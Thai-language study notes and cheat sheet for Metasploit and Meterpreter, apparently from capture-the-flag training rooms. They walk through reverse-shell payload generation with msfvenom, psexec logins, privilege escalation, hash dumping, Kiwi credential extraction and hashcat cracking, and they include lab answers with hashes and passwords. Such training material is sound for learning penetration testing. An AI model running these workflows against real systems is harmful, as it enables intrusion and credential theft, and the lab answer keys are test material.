# Metasploit Framework (ฉบับภาษาไทย)

นี่คือบทสรุปที่ครอบคลุมของ Metasploit Framework ซึ่งเป็นเครื่องมือหลักที่ใช้ในการสแกน, เจาะระบบ, และดำเนินการหลังการเจาะระบบ (post-exploitation)

## 1. 🧠 แนวคิดหลัก (Core Concepts)

|**คำสั่ง**|**คำอธิบาย**|
|---|---|
|**`msfconsole`**|หน้าต่าง Command-line หลักสำหรับสั่งงาน Metasploit|
|**Context (บริบท)**|สภาพแวดล้อมการทำงานหลังจากใช้ `use` โมดูล (เช่น `msf6 exploit(...) >`) การตั้งค่าจะมีผลเฉพาะกับโมดูลนี้|
|**`search [keyword]`**|ค้นหาโมดูลตาม CVE, ชื่อ Exploit, หรือ Platform|
|**`use [module]`**|เลือกโมดูลที่จะใช้งาน|
|**`info`**|แสดงข้อมูลโดยละเอียดของโมดูลที่เลือก|
|**`show options`**|แสดงพารามิเตอร์ที่จำเป็นและไม่จำเป็นทั้งหมดสำหรับโมดูลปัจจุบัน (เช่น RHOSTS, LHOST, RPORT)|
|**`set [VAR] [VAL]`**|ตั้งค่าพารามิเตอร์ในบริบทปัจจุบัน (เช่น `set RHOSTS 10.10.x.x`)|
|**`setg [VAR] [VAL]`**|ตั้งค่าพารามิเตอร์แบบ **Global** (ส่วนกลาง) ซึ่งจะมีผลกับทุกโมดูลจนกว่าจะปิด `msfconsole`|
|**`exploit` / `run`**|สั่งรันโมดูลที่ตั้งค่าไว้|
|**`back`**|ออกจากบริบทปัจจุบันและกลับไปที่ `msf6 >`|

---

## 2. 🗃️ การจัดการฐานข้อมูล (Database Management)

Metasploit ใช้ฐานข้อมูล PostgreSQL เพื่อจัดเก็บผลการสแกน, จัดการโปรเจกต์ (Workspaces), และทำงานอัตโนมัติ

|**คำสั่ง**|**หน้าที่**|
|---|---|
|**`db_status`**|ตรวจสอบสถานะการเชื่อมต่อกับฐานข้อมูล|
|**`workspace`**|ดู, สลับ, หรือสร้างพื้นที่ทำงาน (โปรเจกต์) (เช่น `workspace -a THM_Project`)|
|**`db_nmap [flags] [target]`**|รัน Nmap และนำเข้าผลลัพธ์ทั้งหมด (hosts, ports, services) ลงในฐานข้อมูลโดยอัตโนมัติ|
|**`hosts`**|แสดงรายการ IP เป้าหมายทั้งหมดที่จัดเก็บไว้ใน workspace ปัจจุบัน|
|**`services`**|แสดงรายการพอร์ตและบริการที่เปิดอยู่ทั้งหมด|
|**`hosts -R`**|(เทคนิคสำคัญ) ดึง IP ทั้งหมดจากฐานข้อมูลมาตั้งค่าเป็น `RHOSTS` โดยอัตโนมัติ|

---

## 3. 🛡️ การเจาะระบบและการจัดการ Session (Exploitation & Session Management)

หลังจากเจาะระบบสำเร็จ เราจะได้ "Session" (การเชื่อมต่อ) กลับมา

|**คำสั่ง**|**หน้าที่**|
|---|---|
|**`sessions -l`**|(`-l` = list) แสดงรายการ Session ทั้งหมดที่ยัง Active อยู่|
|**`^Z` (Ctrl+Z)** หรือ **`background`**|"ย่อ" Session ปัจจุบัน (เช่น `meterpreter >`) เพื่อกลับไปที่ `msfconsole`|
|**`sessions -i [ID]`**|(`-i` = interact) "กลับเข้าไป" ใน Session ที่เราย่อไว้ (เช่น `sessions -i 1`)|
|**`sessions -k [ID]`**|(`-k` = kill) สั่งปิด Session นั้น|

---

## 4. 🚀 การทำงานหลังเจาะระบบ (Post-Exploitation)

นี่คือขั้นตอนที่ซับซ้อนในการ "อัปเกรด" Shell ธรรมดาให้เป็น Meterpreter, ยกระดับสิทธิ์, และดึง Hash

|**ขั้นตอน**|**คำสั่ง**|**คำอธิบาย/ผลลัพธ์**|
|---|---|---|
|**1. เจาะระบบครั้งแรก**|`exploit` (เช่น `ms17_010`)|เราได้ **Session 1** (Shell ธรรมดา `C:\>`)|
|**2. พบปัญหา**|`reg save hklm\sam sam.hiv`|`ERROR: A required privilege is not held.` (สิทธิ์ไม่พอ)|
|**3. ย่อ Shell**|`^Z` (Ctrl+Z) แล้วกด `y`|ย่อ Session 1 เพื่อกลับไปที่ `msfconsole`|
|**4. อัปเกรด Shell**|`use post/multi/manage/shell_to_meterpreter`<br><br>  <br><br>`set SESSION 1`<br><br>  <br><br>`set LHOST [IP เรา]`<br><br>  <br><br>`run`|โมดูลอัปเกรดทำงาน, เปิด **Session 2** (Meterpreter)|
|**5. เข้า Meterpreter**|`sessions -i 2`|Prompt เปลี่ยนเป็น `meterpreter >`|
|**6. ยกระดับสิทธิ์**|`getsystem`|ยกระดับสิทธิ์เป็น `NT AUTHORITY\SYSTEM` (สำหรับ Windows)|
|**7. ดึง Hash**|`hashdump` (Windows) หรือ<br><br>  <br><br>`use post/linux/gather/hashdump` (Linux)|ดึง Hash ทั้งหมดจากไฟล์ SAM หรือ /etc/shadow|

**คำตอบ (จากโจทย์):** NTLM hash ของ `pirate` คือ `8ce9a3ebd1647fcc5e04025019f4b875`

---

## 5. 💣 การสร้าง Payload (Msfvenom & Handler)

เมื่อเราไม่ใช้ Exploit Module (เช่น ช่องโหว่อัปโหลดไฟล์) เราต้องสร้าง Payload ด้วย **Msfvenom** และตั้งค่า **Handler** (ตัวรับ) ด้วยตนเอง

|**เครื่องมือ**|**คำสั่งตัวอย่าง**|**หน้าที่**|
|---|---|---|
|**Msfvenom**|`msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=... -f elf -o shell.elf`|สร้างไฟล์ Payload (ELF, EXE, PHP, ASP, ฯลฯ)|
|**Handler**|`use exploit/multi/handler`|โมดูลที่ใช้ทำหน้าที่เป็น "ตัวรับ" (Listener) เพื่อรอจับการเชื่อมต่อ|

**Workflow ของ Msfvenom:**

1. **สร้าง Payload (Terminal 1):**
    
    Bash
    
    ```
    # สร้างไฟล์ .elf ให้เชื่อมต่อกลับมาที่ LHOST ของเราบนพอร์ต 4444
    msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.4.10.128 LPORT=4444 -f elf -o shell.elf
    ```
    
2. **ตั้งค่าตัวรับ (Terminal 2 - msfconsole):**
    
    Bash
    
    ```
    msf6 > use exploit/multi/handler
    # (สำคัญ!) ตั้งค่า PAYLOAD, LHOST, LPORT ให้ตรงกับที่สร้างใน Msfvenom
    msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
    msf6 exploit(multi/handler) > set LHOST 10.4.10.128
    msf6 exploit(multi/handler) > set LPORT 4444
    msf6 exploit(multi/handler) > run
    [*] Started reverse TCP handler...
    ```
    
3. **โอนย้ายและสั่งรัน (Terminal 3 & 4):**
    
    - ใช้ Python Web Server (`python3 -m http.server 9000`) เพื่อโฮสต์ไฟล์
        
    - บนเครื่องเหยื่อ, ใช้ `wget` เพื่อดาวน์โหลด `shell.elf`
        
    - รัน `chmod +x shell.elf` และ `./shell.elf`
        
4. **รับ Session (กลับไปที่ Terminal 2):**
    
    - `[*] Meterpreter session 1 opened...`
        

---

# Metasploit: Meterpreter

นี่คือบทสรุปที่ครอบคลุมของโมดูล Metasploit: Meterpreter (Task 1-5), รวมถึงแนวคิดหลัก, คำสั่ง, และการ walkthrough โจทย์ท้าทายหลังการเจาะระบบ

## 1. Task 1: แนะนำ Meterpreter (Introduction)

### 1.1 แนวคิดหลัก (Core Concepts)

**Meterpreter** คือ Payload ขั้นสูงของ Metasploit มันไม่ใช่แค่ Shell ธรรมดา แต่เป็น Agent ที่ทรงพลังซึ่งทำงานในหน่วยความจำของเหยื่อ ถูกออกแบบมาเพื่อการล่องหน (Stealth) และความยืดหยุ่น

- **รันในหน่วยความจำ (In-Memory Execution):** Meterpreter จะอยู่ใน RAM ของเป้าหมายทั้งหมดและไม่เคยเขียนตัวเองลงฮาร์ดดิสก์ ซึ่งช่วยหลบเลี่ยง Antivirus (AV) พื้นฐานที่สแกนไฟล์บนดิสก์
    
- **การแฝงตัวในโพรเซส (Process Injection):** มันไม่รันเป็นโพรเซสของตัวเอง (เช่น `meterpreter.exe`) แต่จะ "ฉีด" (inject) ตัวเองเข้าไปในโพรเซสที่มีอยู่จริงและถูกต้องตามกฎหมาย (เช่น `spoolsv.exe` หรือ `lsass.exe`)
    
- **การสื่อสารที่เข้ารหัส (Encrypted Communication):** การสื่อสารทั้งหมดระหว่างคุณ (ผู้โจมตี) และ Agent Meterpreter จะถูกเข้ารหัส (TLS) ซึ่งช่วยซ่อนคำสั่งจากระบบตรวจจับการบุกรุกเครือข่าย (IDS/IPS)
    

### 1.2 คำสั่งและเทคนิค (Commands & Techniques)

เราสามารถเห็นการแฝงตัวของโพรเซสได้โดยการเปรียบเทียบผลลัพธ์ของ `getpid` (ID โพรเซสของ Meterpreter) และ `ps` (รายการโพรเซส)

```
meterpreter > getpid 
Current pid: 1304

meterpreter > ps
Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 ...
 716   596   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
 ...
 1304  692   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 ...
```

> **วิเคราะห์:** `getpid` แสดงว่าเราอยู่ใน PID `1304`, แต่รายการ `ps` แสดงว่า PID `1304` คือ `spoolsv.exe` นี่พิสูจน์ว่า Meterpreter กำลังซ่อนตัวอยู่ในโพรเซสที่ถูกต้องตามกฎหมายนั้น

---

## 2. Task 2: รสชาติต่างๆ ของ Meterpreter (Flavors)

### 2.1 แนวคิดหลัก (Core Concepts)

Meterpreter มีหลาย "รสชาติ" (เวอร์ชัน) เพื่อให้เหมาะกับเป้าหมายและสถานการณ์ที่แตกต่างกัน

1. **Staged (`/`) vs. Inline/Stageless (`_`):**
    
    - **Staged (เช่น `windows/x64/meterpreter/reverse_tcp`):** "stager" ขนาดเล็กจะถูกส่งไปก่อน ซึ่งจะเชื่อมต่อกลับมาเพื่อดาวน์โหลด Payload Meterpreter ตัวเต็ม
        
    - **Inline (เช่น `windows/x64/meterpreter_reverse_tcp`):** Payload ทั้งหมดจะถูกส่งไปในไฟล์เดียว มันใหญ่กว่า แต่ก็เสถียรกว่า
        
2. ตามแพลตฟอร์ม (Platform-Specific):
    
    มีเวอร์ชัน Meterpreter สำหรับเกือบทุก OS และสภาพแวดล้อม (Windows, Linux, OSX, PHP, Python, Java, Android, ฯลฯ)
    

### 2.2 คำสั่งและเทคนิค (Commands & Techniques)

เมื่อใช้โมดูล Exploit, Metasploit จะเลือก Payload เริ่มต้นที่เข้ากันได้โดยอัตโนมัติ คุณสามารถดู "รสชาติ" อื่นๆ ที่เข้ากันได้ทั้งหมดโดยใช้คำสั่ง `show payloads`

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > show payloads 

Compatible Payloads
===================

   #   Name                                        Disclosure Date  Rank    Check  Description
   -   ----                                        ---------------  ----    -----  -----------
   0   generic/custom                                               manual  No     Custom Payload
   1   generic/shell_bind_tcp                                       manual  No     Generic Command Shell, Bind TCP Inline
   2   generic/shell_reverse_tcp                                    manual  No     Generic Command Shell, Reverse TCP Inline
...
   6   windows/x64/meterpreter/bind_ipv6_tcp                        manual  No     Windows Meterpreter...
...
```

---

## 3. Task 3: คำสั่งของ Meterpreter (Commands)

### 3.1 แนวคิดหลัก (Core Concepts)

เมื่อคุณได้ Prompt `meterpreter >` คุณจะมีชุดคำสั่งในตัวที่ทรงพลัง คำสั่ง `help` คือเพื่อนที่ดีที่สุดของคุณ

### 3.2 คำสั่งและเทคนิค (Key Commands)

|**หมวดหมู่**|**คำสั่ง**|**คำอธิบาย**|
|---|---|---|
|**Core**|`help`, `background`, `exit`|จัดการ Session|
|**File System**|`ls`, `pwd`, `cd`, `cat`, `search`|นำทางในระบบไฟล์ของเหยื่อ|
||**`download`** / **`upload`**|(สำคัญ) โอนย้ายไฟล์ระหว่างเหยื่อและผู้โจมตี|
|**System**|**`getuid`**|ตรวจสอบสิทธิ์ผู้ใช้ปัจจุบันของคุณ|
||**`sysinfo`**|ดูข้อมูลระบบของเหยื่อ (OS, ชื่อคอมพิวเตอร์)|
||**`ps`**|แสดงรายการโพรเซสที่กำลังทำงาน|
||**`shell`**|กลับไปใช้ Shell มาตรฐานของระบบ (เช่น `C:\>`)|
|**Power**|**`getsystem`**|คำสั่งที่ทรงพลังที่สุด; พยายามยกระดับสิทธิ์เป็น `NT AUTHORITY\SYSTEM`|
||**`hashdump`**|ดึง NTLM password hashes ทั้งหมด (ต้องมีสิทธิ์ `SYSTEM`)|
||`keyscan_start`, `screenshot`|เครื่องมือดักจับการกดคีย์บอร์ดและถ่ายภาพหน้าจอ|

---

## 4. Task 4: ขั้นตอนการทำงานหลังเจาะระบบ (Workflow)

### 4.1 แนวคิดหลัก (Core Concepts)

Task นี้สาธิตขั้นตอนการทำงานมาตรฐานที่ Pentester ใช้ _หลังจาก_ ได้ Shell เพื่อให้แน่ใจว่า Session เสถียรและยกระดับสิทธิ์

### 4.2 คำสั่งและเทคนิค (Commands & Techniques)

1. **ตรวจสอบสิทธิ์:** ใช้ `getuid` เพื่อดูว่าคุณเป็นใคร
    
2. **หาโพรเซสที่เสถียร:** ใช้ `ps` เพื่อหาโพรเซสที่มีสิทธิ์สูง (`SYSTEM`) และเสถียร (เช่น `lsass.exe` หรือ `winlogon.exe`)
    
3. **ย้ายโพรเซส:** ใช้ `migrate [PID]` เพื่อย้าย Meterpreter เข้าไปในโพรเซสที่เสถียรนั้น ซึ่งจะทำให้ Session ของคุณคงอยู่แม้ว่าโพรเซสเดิม (เช่น `spoolsv.exe`) จะแครช
    
4. **ดึง Hash:** เมื่อคุณเป็น `SYSTEM` (ใช้ `getsystem` หากจำเป็น), รัน `hashdump` เพื่อขโมย Credentials
    

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > ps
...
 PID   PPID  Name                  User
 ---   ----  ----                  ----
 716   596   lsass.exe             NT AUTHORITY\SYSTEM
...

meterpreter > migrate 716
[*] Migrating from 1304 to 716...
[*] Migration completed successfully.

meterpreter > hashdump
Administrator:500:aad3...:31d6...
Jon:1000:aad3b...:ffb43...
...
```

---

## 5. Task 5: Post-Exploitation ขั้นสูง และโจทย์ท้าทาย

### 5.1 แนวคิดหลัก (Core Concepts)

พลังที่แท้จริงของ Meterpreter มาจากความสามารถในการโหลด **extensions (ส่วนเสริม)** โดยใช้คำสั่ง `load` ส่วนเสริมที่โด่งดังที่สุดคือ **Kiwi** (เวอร์ชันของ **Mimikatz** ที่พอร์ตมาสำหรับ Metasploit)

ในขณะที่ `hashdump` จะได้ NTLM _hashes_ (ที่ต้องนำไปแคร็ก), `Kiwi` (เช่น คำสั่ง `creds_all`) มักจะสามารถค้นหา **รหัสผ่านตัวจริง (cleartext passwords)** ได้โดยตรงจากหน่วยความจำของคอมพิวเตอร์

```
meterpreter > load kiwi
Loading extension kiwi...Success.

meterpreter > help
...
Kiwi Commands
=============
    Command                Description
    -------                -----------
    creds_all              Retrieve all credentials (parsed)
    creds_kerberos         Retrieve Kerberos creds (parsed)
    ...
```

### 5.2 เฉลยโจทย์และวิธีทำ (Challenge Q&A Walkthrough)

เราได้รับ Credentials (`ballen`:`Password1`) และได้รับมอบหมายให้ค้นหา Flag และ Hash หลายรายการ

#### **Q: What is the computer name? (ชื่อคอมพิวเตอร์คืออะไร?)**

**A: `ACME-TEST`**

Bash

```
# 1. เข้ายึดเครื่องด้วย psexec และ credentials ที่ให้มา
msf6 > use exploit/windows/smb/psexec
msf6 exploit(...) > set RHOSTS [TARGET_IP]
msf6 exploit(...) > set SMBUser ballen
msf6 exploit(...) > set SMBPass Password1
msf6 exploit(...) > run
[*] Meterpreter session 1 opened...

# 2. ดูข้อมูลระบบ
meterpreter > sysinfo
Computer        : ACME-TEST
...
```

#### **Q: What is the target domain? (โดเมนของเป้าหมายคืออะไร?)**

**A: `FLASH`**

Bash

```
# 3. ดูข้อมูลระบบ (จากคำสั่งเดียวกัน)
meterpreter > sysinfo
...
Domain          : FLASH
...
```

#### **Q: What is the name of the share likely created by the user? (Share ที่ user น่าจะสร้างขึ้นมาชื่อว่าอะไร?)**

**A: `speedster`**

Bash

```
# 4. ใช้โมดูล Post-Exploitation เพื่อค้นหา Share
# (คุณต้องย่อ Session ก่อน)
meterpreter > background
msf6 exploit(...) > use post/windows/gather/enum_shares
msf6 post(...) > set SESSION 1
msf6 post(...) > run
...
[+] Found share: speedster (C:\Share)
...
# (กลับเข้า Session: sessions -i 1)
```

#### **Q: What is the NTLM hash of the jchambers user? (NTLM hash ของ user jchambers คืออะไร?)**

**A: `69596c7aa1e8daee17f8e78870e25a5c`**

Bash

```
# 5. ยกระดับสิทธิ์เป็น SYSTEM
meterpreter > getsystem
...got system...

# 6. ดึง Hashes
meterpreter > hashdump
...
jchambers:1114:aad3...:69596c7aa1e8daee17f8e78870e25a5c:::
...
```

#### **Q: What is the cleartext password of the jchambers user? (รหัสผ่านตัวจริงของ jchambers คืออะไร?)**

**A: `Trustno1`**

Bash

```
# 7. (บนเครื่อง Attacker ของคุณ, ใน Terminal ใหม่)
# 7a. สร้างไฟล์ Hash
echo "69596c7aa1e8daee17f8e78870e25a5c" > hash.txt
# 7b. แคร็กด้วย Hashcat (Mode 1000 = NTLM)
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
...
69596c7aa1e8daee17f8e78870e25a5c:Trustno1
...
```

#### **Q: Where is the "secrets.txt" file located? (ไฟล์ "secrets.txt" อยู่ที่ไหน?)**

**A: `c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt`**

Bash

```
# 8. ค้นหาไฟล์บนเครื่องเหยื่อ
meterpreter > search -f secrets.txt
Found 1 result...
    c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt
```

#### **Q: What is the Twitter password revealed in the "secrets.txt" file? (รหัสผ่าน Twitter ที่อยู่ในไฟล์คืออะไร?)**

**A: `KDSvbsw3849!`**

Bash

```
# 9. อ่านไฟล์ (ใช้ " " เพราะ Path มีช่องว่าง)
meterpreter > cat "c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt"
My Twitter password is KDSvbsw3849!
```

#### **Q: Where is the "realsecret.txt" file located? (ไฟล์ "realsecret.txt" อยู่ที่ไหน?)**

**A: `c:\inetpub\wwwroot\realsecret.txt`**

Bash

```
# 10. ค้นหาไฟล์ถัดไป
meterpreter > search -f realsecret.txt
Found 1 result...
    c:\inetpub\wwwroot\realsecret.txt
```

#### **Q: What is the real secret? (ความลับที่แท้จริงคืออะไร?)**

**A: `The Flash is the fastest man alive`**

Bash

```
# 11. อ่านไฟล์สุดท้าย
meterpreter > cat c:\inetpub\wwwroot\realsecret.txt
The Flash is the fastest man alive
```

---

# 🚀 Cheat Sheet: Metasploit Meterpreter

นี่คือสรุปเทคนิค (Workflows) และคำสั่งสำคัญที่ใช้ในโมดูล Meterpreter

## 1. วิธีการและ Workflow (Methods & Workflows)

นี่คือขั้นตอนการทำงานทีละขั้นตอนที่คุณได้ทำในโมดูลนี้

### Workflow: การยึดเครื่องด้วย `psexec` (เมื่อรู้ Credentials)

- **เป้าหมาย:** ใช้ Username/Password ที่รู้ เพื่อยืนยันตัวตนกับเป้าหมายและเปิด Meterpreter Session
    
- **ขั้นตอน:**
    
    1. `msfconsole`
        
    2. `use exploit/windows/smb/psexec`
        
    3. `set payload windows/x64/meterpreter/reverse_tcp`
        
    4. `set RHOSTS [IP เหยื่อ]`
        
    5. `set LHOST [IP ผู้โจมตี]`
        
    6. `set SMBUser [User ที่รู้]` (เช่น `ballen`)
        
    7. `set SMBPass [Pass ที่รู้]` (เช่น `Password1`)
        
    8. `run`
        
    9. (ผลลัพธ์) `meterpreter >`
        

### Workflow: การอัปเกรด Shell (Shell to Meterpreter)

- **เป้าหมาย:** อัปเกรด Shell ธรรมดาที่มีสิทธิ์ต่ำ/จำกัด ให้เป็น Meterpreter Session ที่มีฟีเจอร์ครบถ้วน
    
- **ขั้นตอน:**
    
    1. (ใน Shell ธรรมดา `C:\>`) `^Z` (Ctrl+Z) -> กด `y` (เพื่อ Background Session 1)
        
    2. (ใน `msfconsole`) `use post/multi/manage/shell_to_meterpreter`
        
    3. `set SESSION 1` (เลือก Shell ที่จะอัปเกรด)
        
    4. `set LHOST [IP ผู้โจมตี]`
        
    5. `set LPORT [พอร์ตใหม่]` (เช่น `4434`)
        
    6. `run`
        
    7. (ผลลัพธ์) `[*] Meterpreter session 2 opened...`
        
    8. `sessions -i 2` (เข้าสู่ Session ใหม่)
        
    9. (ผลลัพธ์) `meterpreter >`
        

### Workflow: การดึง Hashes (Hashdump)

- **เป้าหมาย:** ขโมย NTLM password hashes ทั้งหมดจากเครื่องเหยื่อ
    
- **ขั้นตอน:**
    
    1. (ใน `meterpreter >`) `getuid` (ตรวจสอบสิทธิ์)
        
    2. (ถ้าไม่ใช่ `SYSTEM`) `getsystem` (ยกระดับสิทธิ์)
        
    3. (เมื่อเป็น `SYSTEM`) `hashdump`
        
    4. (ผลลัพธ์) `jchambers:1114:...:69596c7aa1e8daee17f8e78870e25a5c:::`
        

### Workflow: การค้นหาไฟล์ (File Hunting)

- **เป้าหมาย:** ค้นหาไฟล์ Flag หรือข้อมูลที่ละเอียดอ่อน
    
- **ขั้นตอน:**
    
    1. (ใน `meterpreter >`) `search -f secrets.txt`
        
    2. (ผลลัพธ์) `Found 1 result... c:\...`
        
    3. `cat "c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt"` (ใช้ `"` สำหรับ Path ที่มีช่องว่าง)
        
    4. (ผลลัพธ์) `My Twitter password is KDSvbsw3849!`
        

### Workflow: การแคร็ก Hashes (Password Cracking)

- **เป้าหมาย:** แปลง NTLM hash ที่ขโมยมาให้เป็นรหัสผ่านตัวจริง (cleartext)
    
- **ขั้นตอน:**
    
    1. (เปิด **Terminal ใหม่** บนเครื่อง Attacker ของคุณ)
        
    2. `echo "69596c7aa1e8daee17f8e78870e25a5c" > hash.txt`
        
    3. `hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt`
        
    4. (ผลลัพธ์) `69596c7aa1e8daee17f8e78870e25a5c:Trustno1`
        

---

## 2. คำสั่งสำคัญ (Key Commands)

|**คำสั่ง (ใน Meterpreter)**|**สิ่งที่ต้องทำก่อน (Prerequisite)**|**คำอธิบาย / หน้าที่**|
|---|---|---|
|**`getuid`**|-|"ฉันเป็นใคร?" (ตรวจสอบผู้ใช้ที่ Session กำลังทำงานในฐานะ)|
|**`sysinfo`**|-|"ฉันอยู่ที่ไหน?" (ดูชื่อคอมพิวเตอร์, โดเมน, OS)|
|**`getsystem`**|(มักจะต้องมีสิทธิ์ Admin เริ่มต้น)|พยายามยกระดับสิทธิ์เป็น `NT AUTHORITY\SYSTEM`|
|**`hashdump`**|ต้องรัน `getsystem` สำเร็จก่อน|ดึง NTLM hashes ทั้งหมดจากฐานข้อมูล SAM|
|**`load kiwi`**|-|โหลดส่วนเสริม "Kiwi" (Mimikatz) สำหรับคำสั่งขั้นสูง|
|**`creds_all`**|ต้อง `load kiwi` ก่อน|(ทางเลือก) พยายามดึงรหัสผ่าน "cleartext" จากหน่วยความจำ|
|**`migrate [PID]`**|รัน `ps` ก่อนเพื่อหา PID เป้าหมาย|ย้าย Meterpreter เข้าไปในโพรเซสอื่น (เพื่อความเสถียร)|
|**`ps`**|-|แสดงรายการโพรเซสที่กำลังทำงานทั้งหมดบนเครื่องเหยื่อ|
|**`search -f [filename]`**|-|ค้นหาไฟล์ (เช่น `search -f secrets.txt`)|
|**`cat [path]`**|ต้องรู้ Path ที่แน่นอน (จาก `search`)|อ่านเนื้อหาของไฟล์ (ใช้ `"..."` ถ้า Path มีช่องว่าง)|
|**`download [victim_path]`**|-|ดาวน์โหลดไฟล์จากเหยื่อมายังเครื่องผู้โจมตี|
|**`upload [attacker_path]`**|-|อัปโหลดไฟล์จากผู้โจมตีไปยังเครื่องเหยื่อ|
|**`background`** (หรือ `Ctrl+Z`)|-|"ย่อ" Session เพื่อกลับไปที่ `msfconsole`|

## 3. การเลือกใช้เทคนิค (Situational Guide)

ตารางนี้สรุปว่า "เมื่อเจอ X... ควรใช้ Y"

|**🧠 สถานการณ์**|**🚀 เทคนิคที่แนะนำ**|**🎯 เป้าหมาย**|
|---|---|---|
|ฉันมี **Credentials ที่ถูกต้อง** (เช่น `ballen`:`Password1`)|ใช้ **`exploit/windows/smb/psexec`**|ยืนยันตัวตนโดยตรงเพื่อรับ Meterpreter Session|
|ฉันสแกนเจอ `MS17-010 VULNERABLE` (ไม่มีรหัสผ่าน)|ใช้ **`exploit/windows/smb/ms17_010_eternalblue`**|ยึด Shell เริ่มต้นโดยไม่ต้องยืนยันตัวตน|
|ฉันมี Shell ธรรมดา (`C:\>`), **ไม่ใช่ Meterpreter**|ใช้ **`post/multi/manage/shell_to_meterpreter`**|"อัปเกรด" Shell ธรรมดาให้เป็น Meterpreter เต็มรูปแบบ|
|ฉันมี Meterpreter และ `getuid` แสดง **`SYSTEM`**|ใช้ **`hashdump`**|"ขโมย" NTLM hashes ทั้งหมดจาก SAM ทันที|
|`hashdump` ได้แค่ Hashes, ฉันอยากได้ **รหัสผ่านตัวจริง**|ใช้ **`load kiwi`** -> **`creds_all`**|"ดึง" รหัสผ่านตัวจริง (Cleartext) จากหน่วยความจำ (LSASS)|
|ฉันเจอ **ช่องโหว่อัปโหลดไฟล์** บนเว็บไซต์ (เช่น PHP)|ใช้ **`msfvenom`** + **`exploit/multi/handler`**|สร้าง Payload (เช่น `shell.php`), อัปโหลด, และ "รอจับ" การเชื่อมต่อ|
|ฉันมี Meterpreter, แต่ `getuid` แสดง **User สิทธิ์ต่ำ**|ใช้ **`getsystem`**|พยายาม "ยกระดับสิทธิ์" (Privilege Escalation) เพื่อเป็น `SYSTEM`|
|Session ของฉันอยู่ใน **โพรเซสที่ไม่เสถียร** (เช่น `spoolsv.exe`)|ใช้ **`ps`** (เพื่อหา PID) -> **`migrate [PID]`**|"ย้าย" Meterpreter ไปยังโพรเซสที่เสถียรกว่า (เช่น `lsass.exe`)|
